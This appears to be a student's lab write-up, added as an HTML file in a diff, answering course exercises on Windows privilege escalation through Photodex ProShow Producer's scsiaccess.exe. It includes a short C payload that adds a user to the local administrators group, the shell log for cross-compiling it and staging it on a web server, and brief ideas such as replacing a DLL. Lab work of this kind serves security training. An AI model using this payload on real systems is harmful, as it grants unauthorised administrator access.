@@ -1,0 +1,39 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Exercises11.2.3-Privilege Escalation</title>
+</head><body>11.2.3 - Exercises<br/>
+1. Use pyinstaller to compile a Python exploit into a standalone .exe.<br/>
+2. Install Photodex ProShow Producer on your Windows host. Escalate privileges<br/>
+from a standard user account.<br/>
+3. Can you find additional ways of escalating permissions, outside of what is<br/>
+described in the course?<br/>
+<br/>
+1.<br/>
+Successfully compiled a Python exploit into a standalone .exe. <br/>
+<img src="screenshot.png" /><br/>
+<br/>
+2. <br/>
+Privilege escalation completed with scsiaccess.exe<br/>
+<img src="screenshot 2.png" /><br/>
+<br/>
+root@:~/labs/privilegeEscalation&gt; vim useradd.c <br/>
+root@:~/labs/privilegeEscalation&gt; cp useradd.exe /var/www/html<br/>
+root@:~/labs/privilegeEscalation&gt; i686-w64-mingw32-gcc useradd.c -o useradd.exe<br/>
+root@:~/labs/privilegeEscalation&gt; file useradd.exe<br/>
+useradd.exe: PE32 executable (console) Intel 80386, for MS Windows<br/>
+root@:~/labs/privilegeEscalation&gt; cp useradd.exe /var/www/html<br/>
+root@:~/labs/privilegeEscalation&gt; cat useradd.c <br/>
+#include &lt;stdlib.h&gt; /* system, NULL, EXIT_FAILURE */<br/>
+int main ()<br/>
+{<br/>
+int i;<br/>
+i=system ("net localgroup administrators lowpriv /add");<br/>
+return 0;<br/>
+}<br/>
+root@:~/labs/privilegeEscalation&gt; <br/>
+<br/>
+<br/>
+3. <br/>
+A DLL coule be replaced. Manually trying usernames and passwords retrieved from the /etc/passwd file is a method. Files in the shared directories are a good target.</body></html>
